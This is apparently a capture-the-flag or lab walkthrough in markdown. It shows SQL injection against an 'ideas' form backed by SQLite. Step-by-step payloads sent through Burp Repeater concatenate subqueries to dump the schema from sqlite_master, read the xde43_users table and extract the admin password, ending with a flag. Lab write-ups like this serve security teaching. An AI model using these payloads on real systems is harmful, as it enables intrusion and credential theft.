# share the ideas

```
'
```

<img width="1095" height="232" alt="image" src="https://github.com/user-attachments/assets/6a05388c-2c72-4405-8fb0-8b99cea4e2c6" />

---

### send request to repeater

<img width="1583" height="714" alt="image" src="https://github.com/user-attachments/assets/46ae471b-d838-4766-a443-e80b2517b20f" />

### now try 

```sql
test ' || (select sql from sqlite_master) || '
```

<img width="1492" height="405" alt="image" src="https://github.com/user-attachments/assets/1b6e313f-6e56-4282-9aac-cbf5277a4d7c" />

### now try to get data form table **`xde43_users`**

```
idea=test ' || (select * from xde43_users) || '
```

<img width="1543" height="673" alt="image" src="https://github.com/user-attachments/assets/859200ca-654e-45a6-8384-d2bea339e02a" />

### now try to get password coulmn :

```
idea=test ' || (select password from xde43_users) || '
```

<img width="1534" height="513" alt="image" src="https://github.com/user-attachments/assets/4bec664e-9d87-4960-b15a-b54e726ee5e9" />

> ### but i don't know which user this passowrd belong to 

### now will filter it by role 

```
idea=test ' || (select password from xde43_users where role='admin') || '
```

<img width="1316" height="371" alt="image" src="https://github.com/user-attachments/assets/2e84f630-4719-43a5-9b4c-001d506142ae" />

```
flag245698
```

